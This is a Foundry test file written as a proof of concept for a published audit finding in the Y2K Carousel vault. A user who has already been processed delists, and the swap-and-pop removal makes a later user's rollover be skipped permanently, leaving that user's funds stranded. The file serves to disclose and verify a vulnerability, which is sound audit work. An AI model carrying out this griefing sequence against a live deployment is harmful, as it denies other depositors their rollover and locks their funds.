// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../src/src/v2/Carousel/Carousel.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @dev Minimal real ERC-20 for the opaque underlying + emissions tokens the
/// audited Carousel treats as plain tokens. No protocol logic lives here.
contract Y2KMockToken is IERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    constructor(string memory n, string memory s) { name = n; symbol = s; }
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; emit Transfer(address(0), to, amount); }
    function approve(address spender, uint256 amount) external override returns (bool) { allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; }
    function transfer(address to, uint256 amount) external override returns (bool) { _transfer(msg.sender, to, amount); return true; }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal { balanceOf[from] -= amount; balanceOf[to] += amount; emit Transfer(from, to, amount); }
}

/// Reproduces Sherlock 2023-03-Y2K #72 (H-2) against the REAL audited Carousel
/// (sherlock-audit/2023-03-Y2K @ 93e3994, Earthquake/src/v2/Carousel/Carousel.sol).
///
/// Bug: `mintRollovers` tracks progress with `rolloverAccounting[epoch]` (a bare
/// index into `rolloverQueue`), while `delistInRollover` removes an entry with a
/// swap-and-pop that moves the LAST queued user into the removed slot. An earlier
/// user who is already processed can then delist, shifting a later, not-yet-
/// processed user into an index BELOW `rolloverAccounting`, so the next
/// `mintRollovers` skips them entirely — their funds never roll over.
contract PoC_18534 is Test {
    Carousel internal vault;
    Y2KMockToken internal asset;
    Y2KMockToken internal emissionsToken;

    address internal alice = address(0xA11CE); // earlier queue user (the griefer)
    address internal bob = address(0xB0B);      // later queue user (the victim)

    uint256 internal constant EPOCH = 1;
    uint256 internal constant NEXT_EPOCH = 2;
    uint256 internal constant RELAYER_FEE = 1 ether; // must be >= 10000 (constructor)
    uint256 internal constant DEPOSIT = 10 ether;

    function setUp() public {
        vm.warp(1_675_884_389);
        asset = new Y2KMockToken("Underlying", "UND");
        emissionsToken = new Y2KMockToken("Emissions", "EMI");

        // Deployer (this test) is the factory (msg.sender), controller and treasury,
        // exercising the real onlyFactory / onlyController access paths.
        vault = new Carousel(
            Carousel.ConstructorArgs({
                isWETH: false,
                assetAddress: address(asset),
                name: "Carousel",
                symbol: "CAR",
                tokenURI: "uri",
                token: address(0x1234),
                strike: 1e18,
                controller: address(this),
                treasury: address(this),
                emissionsToken: address(emissionsToken),
                relayerFee: RELAYER_FEE,
                depositFee: 0
            })
        );

        asset.mint(alice, 100 ether);
        asset.mint(bob, 100 ether);
        vm.prank(alice); asset.approve(address(vault), type(uint256).max);
        vm.prank(bob); asset.approve(address(vault), type(uint256).max);

        // Epoch begins in the future so deposits are inside the deposit window.
        vault.setEpoch(uint40(block.timestamp + 1 days), uint40(block.timestamp + 2 days), EPOCH);
        vault.setEmissions(EPOCH, 0);

        // Alice enlists first (queue index 0), Bob second (queue index 1).
        vm.prank(alice); vault.deposit(EPOCH, DEPOSIT, alice);
        vm.prank(bob);   vault.deposit(EPOCH, DEPOSIT, bob);
        vm.prank(alice); vault.enlistInRollover(EPOCH, DEPOSIT, alice);
        vm.prank(bob);   vault.enlistInRollover(EPOCH, DEPOSIT, bob);
    }

    function testEarlierUserGriefsLaterUserRollover() public {
        // Resolve EPOCH as a WINNING epoch (claimTVL > finalTVL) so rollovers mint.
        vm.warp(block.timestamp + 2 days + 1);
        vault.resolveEpoch(EPOCH);
        vault.setClaimTVL(EPOCH, vault.finalTVL(EPOCH) * 2); // 40e18 vs 20e18 finalTVL
        vault.setEpoch(uint40(block.timestamp + 1 days), uint40(block.timestamp + 2 days), NEXT_EPOCH);

        assertEq(vault.getRolloverQueueLenght(), 2, "queue should hold Alice + Bob");

        // Relayer processes ONE operation: Alice (index 0) is rolled into NEXT_EPOCH.
        vault.mintRollovers(NEXT_EPOCH, 1);
        assertEq(vault.rolloverAccounting(NEXT_EPOCH), 1, "accounting advanced past Alice");
        (, uint256 aliceRollEpoch) = vault.getRolloverBalance(alice);
        assertEq(aliceRollEpoch, NEXT_EPOCH, "Alice rolled into the new epoch");
        assertEq(vault.balanceOf(alice, NEXT_EPOCH), DEPOSIT - RELAYER_FEE, "Alice minted new-epoch shares");

        // Bob has NOT been processed yet: still queued for the old EPOCH, no new shares.
        (, uint256 bobRollEpochBefore) = vault.getRolloverBalance(bob);
        assertEq(bobRollEpochBefore, EPOCH, "Bob still queued for the resolved epoch");
        assertEq(vault.balanceOf(bob, NEXT_EPOCH), 0, "Bob has no new-epoch shares yet");

        // === THE GRIEF ===
        // Alice (already processed, index 0) delists. Swap-and-pop moves Bob (last,
        // index 1) into index 0 and shrinks the queue to length 1, but
        // rolloverAccounting[NEXT_EPOCH] stays at 1.
        vm.prank(alice);
        vault.delistInRollover(alice);
        assertEq(vault.getRolloverQueueLenght(), 1, "queue shrank after delist");
        assertEq(vault.rolloverAccounting(NEXT_EPOCH), 1, "accounting NOT rewound");
        (, uint256 bobRollEpochAfter) = vault.getRolloverBalance(bob);
        assertEq(bobRollEpochAfter, EPOCH, "Bob swapped into index 0, still on old epoch");

        // Any relayer now tries to finish Bob's rollover. Because index (1) already
        // equals the shrunken queue length (1), _operations resolves to 0 and the
        // loop body never runs. Bob is permanently skipped for this epoch.
        vault.mintRollovers(NEXT_EPOCH, 100);

        // === CONCRETE HARM ===
        assertEq(vault.balanceOf(bob, NEXT_EPOCH), 0, "HARM: Bob got ZERO new-epoch shares");
        (, uint256 bobRollEpochFinal) = vault.getRolloverBalance(bob);
        assertEq(bobRollEpochFinal, EPOCH, "HARM: Bob's rollover still stuck on the resolved epoch");
        // Bob's 10e18 remain locked in the resolved (old) epoch: he is denied the
        // rollover core functionality despite having correctly enlisted.
        assertEq(vault.balanceOf(bob, EPOCH), DEPOSIT, "HARM: Bob's funds stranded in old epoch");
        assertEq(vault.rolloverAccounting(NEXT_EPOCH), 1, "HARM: relayer cannot advance past Bob");
    }
}
